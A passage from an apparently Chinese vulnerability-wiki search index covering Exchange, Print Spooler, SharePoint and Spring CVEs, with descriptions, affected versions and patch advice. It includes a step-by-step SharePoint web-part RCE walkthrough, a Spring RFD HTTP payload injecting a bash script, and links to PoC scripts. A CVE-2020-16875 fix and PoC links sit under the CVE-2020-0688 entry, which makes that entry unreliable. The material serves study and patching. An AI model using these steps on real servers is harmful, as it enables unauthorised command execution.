Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Microsoft%20Exchange%20Server/CVE-2020-0688%20Microsoft%20Exchange%20Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"Microsoft Exchange Server\u662f\u5fae\u8f6f\u516c\u53f8\u63a8\u51fa\u7684\u4e00\u5957\u5546\u4e1a\u7535\u5b50\u90ae\u4ef6\u7cfb\u7edf\uff0c\u56e0\u5176\u7a33\u5b9a\u3001\u6613\u7528\u3001\u5b89\u5168\u7b49\u7279\u70b9\u5728\u5168\u7403\u591a\u4e2a\u884c\u4e1a\u88ab\u5e7f\u6cdb\u5730\u5e94\u7528\u3002\u7531\u4e8eExchange Server\u5728\u5b89\u88c5\u90e8\u7f72\u65f6\u672a\u80fd\u521b\u5efa\u5e94\u7528\u552f\u4e00\u7684\u52a0\u5bc6\u5bc6\u94a5\uff0c\u5bfc\u81f4Exchange Server\u5728\u53cd\u5e8f\u5217\u5316\u5904\u7406\u8bf7\u6c42\u4e2d\u7684 __VIEWSTATE \u6570\u636e\u89e6\u53d1\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002Exchange \u662f\u4ee5SYSTEM\u6743\u9650\u542f\u7528\u7684IIS\uff0c\u56e0\u6b64\u666e\u901a\u767b\u5f55\u7528\u6237\u4e5f\u53ef\u901a\u8fc7\u53cd\u5e8f\u5217\u5316\u8fbe\u5230\u63d0\u6743\u7684\u76ee\u7684\uff0c\u8fdb\u800c\u53ef\u4ee5\u83b7\u53d6\u57df\u7ba1\u7406\u7684\u6743\u9650\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"Web%E5%AE%89%E5%85%A8/Microsoft%20Exchange%20Server/CVE-2020-0688%20Microsoft%20Exchange%20Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","text":"Microsoft Exchange Server 2019 Microsoft Exchange Server 2016 Microsoft Exchange Server 2013 Microsoft Exchange Server 2010","title":"\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/Microsoft%20Exchange%20Server/CVE-2020-0688%20Microsoft%20Exchange%20Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_3","text":"microsoft:exchange_server_2016: cu16/cu17 microsoft:exchange_server_2019: cu5/cu6","title":"\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/Microsoft%20Exchange%20Server/CVE-2020-0688%20Microsoft%20Exchange%20Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_4","text":"\u5efa\u8bae\u5e7f\u5927\u7528\u6237\u53ca\u65f6\u5b89\u88c5\u6700\u65b0\u8865\u4e01\uff0c\u8865\u4e01\u5bf9\u5e94\u7248\u672c\u4e0e\u4e0b\u8f7d\u5730\u5740\u5982\u4e0b\uff1a https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16875 \u5feb\u901f\u5229\u7528\u89c6\u9891\u94fe\u63a5 https://youtu.be/7d_HoQ0LVy8 ps \u7248POC\uff1ahttps://srcincite.io/pocs/cve-2020-16875.ps1.txt https://srcincite.io/pocs/cve-2020- 16875.ps1.txt py \u7248POC\uff1ahttps://srcincite.io/pocs/cve-2020-16875.py.txt https://srcincite.io/pocs/cve-2020- 16875.py.txt","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"Web%E5%AE%89%E5%85%A8/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1048%20Microsoft%20Windows%20Print%20Spooler%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 Microsoft Windows 10 Windows 10 1607\u7248\u672c Windows 10 1709\u7248\u672c Windows 10 1803\u7248\u672c Windows 10 1809\u7248\u672c Windows 10 1903\u7248\u672c Windows 10 1909\u7248\u672c Windows 7 SP1 Windows 8.1 Windows RT 8.1 Windows Server 2008 SP2 Windows Server 2008 R2 SP1 Windows Server 2012 Windows Server 2012 R2 Windows Server 2016 Windows Server 2019 Windows Server 1803\u7248\u672c Windows Server 1903\u7248\u672c Windows Server 1909\u7248\u672c \u4fee\u590d\u5efa\u8bae \u5173\u6ce8\u5b98\u65b9\u53d1\u5e03\u7684\u8865\u4e01\u5347\u7ea7\u53ca\u65f6\u4fee\u590d\u6f0f\u6d1e\u3002 https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1048 POC PrintDemon-master","title":"CVE-2020-1048 Microsoft Windows Print Spooler\u63d0\u6743\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1048%20Microsoft%20Windows%20Print%20Spooler%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/#_1","text":"Microsoft Windows 10 Windows 10 1607\u7248\u672c Windows 10 1709\u7248\u672c Windows 10 1803\u7248\u672c Windows 10 1809\u7248\u672c Windows 10 1903\u7248\u672c Windows 10 1909\u7248\u672c Windows 7 SP1 Windows 8.1 Windows RT 8.1 Windows Server 2008 SP2 Windows Server 2008 R2 SP1 Windows Server 2012 Windows Server 2012 R2 Windows Server 2016 Windows Server 2019 Windows Server 1803\u7248\u672c Windows Server 1903\u7248\u672c Windows Server 1909\u7248\u672c \u4fee\u590d\u5efa\u8bae \u5173\u6ce8\u5b98\u65b9\u53d1\u5e03\u7684\u8865\u4e01\u5347\u7ea7\u53ca\u65f6\u4fee\u590d\u6f0f\u6d1e\u3002 https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1048 POC PrintDemon-master","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/SharePoint/CVE-2020-1181%20SharePoint%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"CVE-2020-1181 SharePoint\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e \u00b6 \u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-19 15:39:29 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u5fae\u8f6fSharePoint\u670d\u52a1\u5668\u5141\u8bb8\u7528\u6237\u521b\u5efaweb\u9875\u9762\uff0c\u4f46\u4e3a\u4e86\u907f\u514d\u88ab\u6ee5\u7528\uff0c\u670d\u52a1\u5668\u4f1a\u4e25\u683c\u9650\u5236\u8fd9\u4e9b\u9875\u9762\u4e0a\u80fd\u591f\u51fa\u73b0\u7684\u7ec4\u4ef6\u3002SharePoint\u670d\u52a1\u5668\u4f1a\u4ee5\u4e0d\u540c\u7684\u65b9\u5f0f\u6765\u5904\u7406\u201c\u81ea\u6709\u201d\u9875\u9762\u548c\u7528\u6237\u5b9a\u4e49\u7684\u9875\u9762\u3002SharePoint\u7684\u201c\u81ea\u6709\u201d\u9875\u9762\u5b58\u653e\u5728\u6587\u4ef6\u7cfb\u7edf\u4e0a\uff0c\u4e0d\u53d7\u4efb\u4f55\u9650\u5236\u3002\u7528\u6237\u9875\u9762\u5b58\u653e\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u53d7\u670d\u52a1\u5668\u7ea6\u675f\u3002\u5176\u4e2d\u6709\u4e9b\u9650\u5236\u6761\u4ef6\u5305\u62ec\u65e0\u6cd5\u4f7f\u7528\u4ee3\u7801\u5757\uff08code block\uff09\u3001\u65e0\u6cd5\u5305\u542b\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u6587\u4ef6\u3002\u7528\u6237\u9875\u9762\u901a\u5e38\u53ea\u80fd\u4f7f\u7528\u9884\u5b9a\u4e49\u5217\u8868\u4e2d\u5141\u8bb8\u7684web\u63a7\u4ef6\u3002 \u5982\u679c\u7528\u6237\u901a\u8fc7\u4e0a\u4f20\u65b9\u5f0f\u521b\u5efa\u65b0\u9875\u9762\uff0c\u90a3\u4e48\u8be5\u9875\u9762\u4e5f\u4f1a\u53d7\u5230\u9650\u5236\u3002\u7136\u800c\uff0c\u5982\u679c\u65b0\u9875\u9762\u901a\u8fc7SharePoint Web Editor\u521b\u5efa\uff0c\u90a3\u4e48\u5c31\u4f1a\u88ab\u5f53\u6210\u201cghost\u201d\u9875\u9762\uff0c\u540c\u6837\u662f\u53ef\u4fe1\u7684\u6e90\u3002\u8fd9\u4e2a\u903b\u8f91\u4e5f\u5f88\u6b63\u5e38\uff0c\u56e0\u4e3aSharePoint Web Editor\u4f1a\u9650\u5236\u80fd\u591f\u6dfb\u52a0\u5230\u9875\u9762\u7684\u5177\u4f53\u7ec4\u4ef6\uff0c\u56e0\u6b64\u9875\u9762\u53ef\u4ee5\u5728\u4e0d\u53d7\u9650\u5236\u7684\u6a21\u5f0f\u4e0b\u5b89\u5168\u8fd0\u884c\u3002 Web Editor\u4e2d\u5141\u8bb8\u4e00\u79cdWeb Part\u7c7b\u578b\uff1aWikiContentWebpart\u3002\u8fd9\u79cdWeb Part\u5141\u8bb8\u5305\u542b\u4efb\u610fASP.NET\u6807\u8bb0\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u79cd\u65b9\u5f0f\uff0c\u5728\u4e0d\u53d7\u9650\u6a21\u5f0f\u4e0b\u8fd0\u884c\u4efb\u610fASP.NET\u6807\u8bb0\uff0c\u6700\u7ec8\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002 POC \u00b6 \u6f14\u793a\u573a\u666f\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528\u7684\u7248\u672c\u4e3a\u9ed8\u8ba4\u914d\u7f6e\u7684Microsoft SharePoint 2019 Server\uff0c\u5b89\u88c5\u5728Windows Server 2019 Datacenter\u7cfb\u7edf\u4e0a\u3002\u670d\u52a1\u5668\u4e3b\u673a\u540d\u4e3asp2019.contoso.lab\uff0c\u5df2\u52a0\u5165contoso.lab\u57df\u4e2d\uff0c\u57df\u63a7\u5236\u5668\u4e3a\u4e00\u53f0\u72ec\u7acb\u7684\u865a\u62df\u673a\u3002\u6211\u4eec\u7684\u76ee\u6807\u4e3b\u673a\u5df2\u5b89\u88c5\u622a\u81f32020\u5e742\u6708\u4efd\u7684\u6240\u6709\u8865\u4e01\uff0c\u56e0\u6b64\u5bf9\u5e94\u7684\u7248\u672c\u53f7\u4e3a16.0.10355.20000\u3002 \u653b\u51fb\u7cfb\u7edf\u4e2d\u53ea\u9700\u8981\u4f7f\u7528\u652f\u6301\u7684web\u6d4f\u89c8\u5668\u5373\u53ef\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u4f7f\u7528\u7684\u6d4f\u89c8\u5668\u4e3aMozilla Firefox 69.0.3\u3002\u6211\u4eec\u8fd8\u4f1a\u4f7f\u7528\u4e0e\u524d\u6587\u7c7b\u4f3c\u7684WikiContentWebpart\uff0c\u5c06\u5176\u547d\u540d\u4e3aWikiContentRCE.xml\u3002 \u9996\u5148\u6211\u4eec\u8bbf\u95eeSharePoint Server\uff0c\u4ee5\u666e\u901a\u7528\u6237\uff08user2\uff09\u901a\u8fc7\u8eab\u4efd\u8ba4\u8bc1\uff1a \u63a5\u4e0b\u6765\u521b\u5efa\u7ad9\u70b9\uff0c\u4f7f\u8be5\u7528\u6237\u53d8\u6210\u8be5\u7ad9\u70b9\u6240\u6709\u8005\uff08owner\uff09\uff0c\u5177\u5907\u6240\u6709\u6743\u9650\u3002 \u70b9\u51fb\u9876\u90e8\u9762\u677f\u7684\u201cSharePoint\u201d\u533a\u57df\uff1a \u7136\u540e\u70b9\u51fb\u201c+ Create site\u201d\u94fe\u63a5\uff1a \u9009\u62e9\u201cTeam Site\u201d\u3002\u73b0\u5728\u6211\u4eec\u9700\u8981\u4e3a\u65b0\u7ad9\u70b9\u8bbe\u7f6e\u540d\u79f0\uff0c\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e\u4e3atestsiteofuser2\u3002 \u70b9\u51fb\u201cFinish\u201d\uff0c\u6210\u529f\u521b\u5efa\u65b0\u7ad9\u70b9\uff1a \u73b0\u5728\u70b9\u51fb\u201cPages\u201d\u94fe\u63a5\uff1a \u6211\u4eec\u9700\u8981\u5207\u6362\u5230\u201cClassic View\u201d\uff0c\u70b9\u51fb\u5de6\u4e0b\u89d2\u7684\u201cReturn to classic SharePoint\u201d\u94fe\u63a5\u5373\u53ef\uff1a \u70b9\u51fb\u201c+ New\u201d\uff0c\u4e3a\u65b0\u9875\u9762\u8bbe\u7f6e\u4e00\u4e2a\u540d\u79f0\u3002\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e\u4e3anewpage1\uff1a \u70b9\u51fb\u201cCreate\u201d\u6309\u94ae\u786e\u8ba4 \u73b0\u5728\u6211\u4eec\u9700\u8981\u5728\u201cINSERT\u201d\u6807\u7b7e\u9875\u4e2d\u9009\u62e9\u201cWeb Part\u201d\uff1a \u5728\u5bf9\u8bdd\u6846\u7a97\u53e3\u4e2d\uff0c\u9009\u62e9\u5de6\u4e0b\u89d2\u7684\u201cUpload Web Part\u201d\u94fe\u63a5\uff0c\u4e0a\u4f20\u6211\u4eec\u6784\u9020\u7684WikiContentRCE.xml\u6587\u4ef6\uff1a \u70b9\u51fbUpload\u3002\u6211\u4eec\u53ef\u80fd\u4f1a\u770b\u5230\u4e00\u4e2a\u8b66\u544a\u5f39\u7a97\uff1a\u201c\u786e\u8ba4\u79bb\u5f00\u9875\u9762\uff1f\u60a8\u8f93\u5165\u7684\u6570\u636e\u53ef\u80fd\u4e0d\u4f1a\u88ab\u4fdd\u5b58\u201d\u3002\u6b64\u65f6\u70b9\u51fb\u201cLeave Page\u201d\u6309\u94ae\u5373\u53ef\uff0c\u8fd4\u56de\u4e3b\u7f16\u8f91\u89c6\u56fe\uff1a \u6211\u4eec\u9700\u8981\u518d\u6b21\u5728INSERT\u6807\u7b7e\u9875\u4e2d\u9009\u62e9Web Part\u5c0f\u90e8\u4ef6\uff0c\u5176\u4e2d\u5c06\u51fa\u73b0\u6211\u4eec\u5bfc\u5165\u7684Web Part\uff1a \u5728\u70b9\u51fbAdd\u6309\u94ae\u4e4b\u524d\uff0c\u6211\u4eec\u5148\u8f6c\u5230\u76ee\u6807SharePoint\u670d\u52a1\u5668\uff0c\u6253\u5f00C:\\windows\\temp\u76ee\u5f55\uff1a \u6b64\u65f6\u8be5\u76ee\u5f55\u4e2d\u4e0d\u5b58\u5728RCE_PoC.txt\u6587\u4ef6\u3002 \u73b0\u5728\u6211\u4eec\u8f6c\u5230\u653b\u51fb\u8005\u4e3b\u673a\uff0c\u5c06\u6211\u4eec\u5bfc\u5165\u7684Web Part\u6dfb\u52a0\u5230\u9875\u9762\u4e2d\uff1a \u518d\u6b21\u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u68c0\u67e5C:\\windows\\temp\u76ee\u5f55\uff1a \u901a\u8fc7\u8fd9\u79cd\u65b9\u6cd5\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\uff0c\u5165\u4fb5\u670d\u52a1\u5668\u3002\u653b\u51fb\u8005\u53ea\u9700\u8981\u5728WikiContentRCE.xml\u6587\u4ef6\u4e2d\uff0c\u5c06echo pwned > c:/windows/temp/RCE_PoC.txt\u5b57\u7b26\u4e32\u66ff\u6362\u6210\u6240\u9700\u7684\u547d\u4ee4\u5373\u53ef\u3002","title":"CVE-2020-1181 SharePoint\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/SharePoint/CVE-2020-1181%20SharePoint%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#cve-2020-1181-sharepoint","text":"\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-19 15:39:29","title":"CVE-2020-1181 SharePoint\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/SharePoint/CVE-2020-1181%20SharePoint%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"\u5fae\u8f6fSharePoint\u670d\u52a1\u5668\u5141\u8bb8\u7528\u6237\u521b\u5efaweb\u9875\u9762\uff0c\u4f46\u4e3a\u4e86\u907f\u514d\u88ab\u6ee5\u7528\uff0c\u670d\u52a1\u5668\u4f1a\u4e25\u683c\u9650\u5236\u8fd9\u4e9b\u9875\u9762\u4e0a\u80fd\u591f\u51fa\u73b0\u7684\u7ec4\u4ef6\u3002SharePoint\u670d\u52a1\u5668\u4f1a\u4ee5\u4e0d\u540c\u7684\u65b9\u5f0f\u6765\u5904\u7406\u201c\u81ea\u6709\u201d\u9875\u9762\u548c\u7528\u6237\u5b9a\u4e49\u7684\u9875\u9762\u3002SharePoint\u7684\u201c\u81ea\u6709\u201d\u9875\u9762\u5b58\u653e\u5728\u6587\u4ef6\u7cfb\u7edf\u4e0a\uff0c\u4e0d\u53d7\u4efb\u4f55\u9650\u5236\u3002\u7528\u6237\u9875\u9762\u5b58\u653e\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u53d7\u670d\u52a1\u5668\u7ea6\u675f\u3002\u5176\u4e2d\u6709\u4e9b\u9650\u5236\u6761\u4ef6\u5305\u62ec\u65e0\u6cd5\u4f7f\u7528\u4ee3\u7801\u5757\uff08code block\uff09\u3001\u65e0\u6cd5\u5305\u542b\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u6587\u4ef6\u3002\u7528\u6237\u9875\u9762\u901a\u5e38\u53ea\u80fd\u4f7f\u7528\u9884\u5b9a\u4e49\u5217\u8868\u4e2d\u5141\u8bb8\u7684web\u63a7\u4ef6\u3002 \u5982\u679c\u7528\u6237\u901a\u8fc7\u4e0a\u4f20\u65b9\u5f0f\u521b\u5efa\u65b0\u9875\u9762\uff0c\u90a3\u4e48\u8be5\u9875\u9762\u4e5f\u4f1a\u53d7\u5230\u9650\u5236\u3002\u7136\u800c\uff0c\u5982\u679c\u65b0\u9875\u9762\u901a\u8fc7SharePoint Web Editor\u521b\u5efa\uff0c\u90a3\u4e48\u5c31\u4f1a\u88ab\u5f53\u6210\u201cghost\u201d\u9875\u9762\uff0c\u540c\u6837\u662f\u53ef\u4fe1\u7684\u6e90\u3002\u8fd9\u4e2a\u903b\u8f91\u4e5f\u5f88\u6b63\u5e38\uff0c\u56e0\u4e3aSharePoint Web Editor\u4f1a\u9650\u5236\u80fd\u591f\u6dfb\u52a0\u5230\u9875\u9762\u7684\u5177\u4f53\u7ec4\u4ef6\uff0c\u56e0\u6b64\u9875\u9762\u53ef\u4ee5\u5728\u4e0d\u53d7\u9650\u5236\u7684\u6a21\u5f0f\u4e0b\u5b89\u5168\u8fd0\u884c\u3002 Web Editor\u4e2d\u5141\u8bb8\u4e00\u79cdWeb Part\u7c7b\u578b\uff1aWikiContentWebpart\u3002\u8fd9\u79cdWeb Part\u5141\u8bb8\u5305\u542b\u4efb\u610fASP.NET\u6807\u8bb0\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u79cd\u65b9\u5f0f\uff0c\u5728\u4e0d\u53d7\u9650\u6a21\u5f0f\u4e0b\u8fd0\u884c\u4efb\u610fASP.NET\u6807\u8bb0\uff0c\u6700\u7ec8\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"Web%E5%AE%89%E5%85%A8/SharePoint/CVE-2020-1181%20SharePoint%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","text":"\u6f14\u793a\u573a\u666f\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528\u7684\u7248\u672c\u4e3a\u9ed8\u8ba4\u914d\u7f6e\u7684Microsoft SharePoint 2019 Server\uff0c\u5b89\u88c5\u5728Windows Server 2019 Datacenter\u7cfb\u7edf\u4e0a\u3002\u670d\u52a1\u5668\u4e3b\u673a\u540d\u4e3asp2019.contoso.lab\uff0c\u5df2\u52a0\u5165contoso.lab\u57df\u4e2d\uff0c\u57df\u63a7\u5236\u5668\u4e3a\u4e00\u53f0\u72ec\u7acb\u7684\u865a\u62df\u673a\u3002\u6211\u4eec\u7684\u76ee\u6807\u4e3b\u673a\u5df2\u5b89\u88c5\u622a\u81f32020\u5e742\u6708\u4efd\u7684\u6240\u6709\u8865\u4e01\uff0c\u56e0\u6b64\u5bf9\u5e94\u7684\u7248\u672c\u53f7\u4e3a16.0.10355.20000\u3002 \u653b\u51fb\u7cfb\u7edf\u4e2d\u53ea\u9700\u8981\u4f7f\u7528\u652f\u6301\u7684web\u6d4f\u89c8\u5668\u5373\u53ef\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u4f7f\u7528\u7684\u6d4f\u89c8\u5668\u4e3aMozilla Firefox 69.0.3\u3002\u6211\u4eec\u8fd8\u4f1a\u4f7f\u7528\u4e0e\u524d\u6587\u7c7b\u4f3c\u7684WikiContentWebpart\uff0c\u5c06\u5176\u547d\u540d\u4e3aWikiContentRCE.xml\u3002 \u9996\u5148\u6211\u4eec\u8bbf\u95eeSharePoint Server\uff0c\u4ee5\u666e\u901a\u7528\u6237\uff08user2\uff09\u901a\u8fc7\u8eab\u4efd\u8ba4\u8bc1\uff1a \u63a5\u4e0b\u6765\u521b\u5efa\u7ad9\u70b9\uff0c\u4f7f\u8be5\u7528\u6237\u53d8\u6210\u8be5\u7ad9\u70b9\u6240\u6709\u8005\uff08owner\uff09\uff0c\u5177\u5907\u6240\u6709\u6743\u9650\u3002 \u70b9\u51fb\u9876\u90e8\u9762\u677f\u7684\u201cSharePoint\u201d\u533a\u57df\uff1a \u7136\u540e\u70b9\u51fb\u201c+ Create site\u201d\u94fe\u63a5\uff1a \u9009\u62e9\u201cTeam Site\u201d\u3002\u73b0\u5728\u6211\u4eec\u9700\u8981\u4e3a\u65b0\u7ad9\u70b9\u8bbe\u7f6e\u540d\u79f0\uff0c\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e\u4e3atestsiteofuser2\u3002 \u70b9\u51fb\u201cFinish\u201d\uff0c\u6210\u529f\u521b\u5efa\u65b0\u7ad9\u70b9\uff1a \u73b0\u5728\u70b9\u51fb\u201cPages\u201d\u94fe\u63a5\uff1a \u6211\u4eec\u9700\u8981\u5207\u6362\u5230\u201cClassic View\u201d\uff0c\u70b9\u51fb\u5de6\u4e0b\u89d2\u7684\u201cReturn to classic SharePoint\u201d\u94fe\u63a5\u5373\u53ef\uff1a \u70b9\u51fb\u201c+ New\u201d\uff0c\u4e3a\u65b0\u9875\u9762\u8bbe\u7f6e\u4e00\u4e2a\u540d\u79f0\u3002\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e\u4e3anewpage1\uff1a \u70b9\u51fb\u201cCreate\u201d\u6309\u94ae\u786e\u8ba4 \u73b0\u5728\u6211\u4eec\u9700\u8981\u5728\u201cINSERT\u201d\u6807\u7b7e\u9875\u4e2d\u9009\u62e9\u201cWeb Part\u201d\uff1a \u5728\u5bf9\u8bdd\u6846\u7a97\u53e3\u4e2d\uff0c\u9009\u62e9\u5de6\u4e0b\u89d2\u7684\u201cUpload Web Part\u201d\u94fe\u63a5\uff0c\u4e0a\u4f20\u6211\u4eec\u6784\u9020\u7684WikiContentRCE.xml\u6587\u4ef6\uff1a \u70b9\u51fbUpload\u3002\u6211\u4eec\u53ef\u80fd\u4f1a\u770b\u5230\u4e00\u4e2a\u8b66\u544a\u5f39\u7a97\uff1a\u201c\u786e\u8ba4\u79bb\u5f00\u9875\u9762\uff1f\u60a8\u8f93\u5165\u7684\u6570\u636e\u53ef\u80fd\u4e0d\u4f1a\u88ab\u4fdd\u5b58\u201d\u3002\u6b64\u65f6\u70b9\u51fb\u201cLeave Page\u201d\u6309\u94ae\u5373\u53ef\uff0c\u8fd4\u56de\u4e3b\u7f16\u8f91\u89c6\u56fe\uff1a \u6211\u4eec\u9700\u8981\u518d\u6b21\u5728INSERT\u6807\u7b7e\u9875\u4e2d\u9009\u62e9Web Part\u5c0f\u90e8\u4ef6\uff0c\u5176\u4e2d\u5c06\u51fa\u73b0\u6211\u4eec\u5bfc\u5165\u7684Web Part\uff1a \u5728\u70b9\u51fbAdd\u6309\u94ae\u4e4b\u524d\uff0c\u6211\u4eec\u5148\u8f6c\u5230\u76ee\u6807SharePoint\u670d\u52a1\u5668\uff0c\u6253\u5f00C:\\windows\\temp\u76ee\u5f55\uff1a \u6b64\u65f6\u8be5\u76ee\u5f55\u4e2d\u4e0d\u5b58\u5728RCE_PoC.txt\u6587\u4ef6\u3002 \u73b0\u5728\u6211\u4eec\u8f6c\u5230\u653b\u51fb\u8005\u4e3b\u673a\uff0c\u5c06\u6211\u4eec\u5bfc\u5165\u7684Web Part\u6dfb\u52a0\u5230\u9875\u9762\u4e2d\uff1a \u518d\u6b21\u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u68c0\u67e5C:\\windows\\temp\u76ee\u5f55\uff1a \u901a\u8fc7\u8fd9\u79cd\u65b9\u6cd5\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\uff0c\u5165\u4fb5\u670d\u52a1\u5668\u3002\u653b\u51fb\u8005\u53ea\u9700\u8981\u5728WikiContentRCE.xml\u6587\u4ef6\u4e2d\uff0c\u5c06echo pwned > c:/windows/temp/RCE_PoC.txt\u5b57\u7b26\u4e32\u66ff\u6362\u6210\u6240\u9700\u7684\u547d\u4ee4\u5373\u53ef\u3002","title":"POC"},{"location":"Web%E5%AE%89%E5%85%A8/Spring/CVE-2020-5398-Spring%20MVC%E7%9A%84RFD%EF%BC%88%E5%8F%8D%E5%B0%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%89/","text":"\u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u4e8e\u5f53\u5730\u65f6\u95f41\u670816\u65e5\uff0c Pivotal Software\uff08Spring\u7cfb\u5217\uff09\u5b98\u65b9\u53d1\u5e03 Spring Framework \u5b58\u5728 RFD\uff08\u53cd\u5c04\u578b\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e\uff09\u7684\u6f0f\u6d1e\u62a5\u544a\uff0c\u6b64\u6f0f\u6d1e\u4e3a\u653b\u51fb\u5ba2\u6237\u7aef\u7684\u6f0f\u6d1e\uff0c\u5b98\u65b9\u5c06\u6f0f\u6d1e\u4e25\u91cd\u7a0b\u5ea6\u8bc4\u4e3a\u9ad8\u3002\u62a5\u544a\u6307\u51fa\uff0c\u5f53\u54cd\u5e94\u4e2d\u8bbe\u7f6e\u4e86\u201cContent-Disposition\u201d\u5934\u4e14filename\u5c5e\u6027\u662f\u7528\u6237\u53ef\u63a7\u65f6\u5bb9\u6613\u53d7\u5230RFD\u653b\u51fb\u3002\u653b\u51fb\u5e94\u6ee1\u8db3\u4ee5\u4e0b\u6240\u6709\u6761\u4ef6\u624d\u53ef\u6210\u529f\uff1a 1.header\u4f7f\u7528org.springframework.http.ContentDisposition\u6765\u9884\u5907 2.\u6587\u4ef6\u540d\u662f\u901a\u8fc7ContentDisposition.Builder#filename(String) \u6216 ContentDisposition.Builder#filename(String, US_ASCII)\u6765\u8bbe\u7f6e\u3002 3.\u6587\u4ef6\u540d\uff08\u5305\u62ec\u6587\u4ef6\u540d\u540e\u7f00\uff09\u4e3a\u7528\u6237\u53ef\u63a7\u3002 4.\u653b\u51fb\u8005\u5df2\u5c06\u4e0b\u8f7d\u7684\u54cd\u5e94\u5185\u5bb9\u6ce8\u5165\u6076\u610f\u547d\u4ee4\u3002 \u653b\u51fb\u8005\u53ef\u5229\u7528RFD\u6f0f\u6d1e\uff0c\u7ed3\u5408\u793e\u5de5\u7b49\u65b9\u5f0f\uff0c\u8ba9\u7528\u6237\u4e0b\u8f7d\u4e00\u4e2a\u6076\u610f\u6587\u4ef6\u5e76\u6267\u884c\uff0c\u4ece\u800c\u5371\u5bb3\u7528\u6237\u7684\u7ec8\u7aef\u5b89\u5168\u3002 \u5f71\u54cd\u8303\u56f4 \u00b6 Spring Framework 5.2.0 to 5.2.2\uff0c5.1.0 to 5.1.12\uff0c5.0.0 to 5.0.15 POC \u00b6 GET /?filename=sample.sh%22%3B&contents=%23!%2Fbin%2Fbash%0Awhoami%27%20--dump-header%20- HTTP/1.1 Host: 192.168.248.129:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 \u4fee\u590d\u5efa\u8bae \u00b6 \u8bf7\u53d7\u5f71\u54cd\u7684\u7528\u6237\u5347\u7ea7\u81f3 Spring Framework 5.2.3\uff0c5.1.13 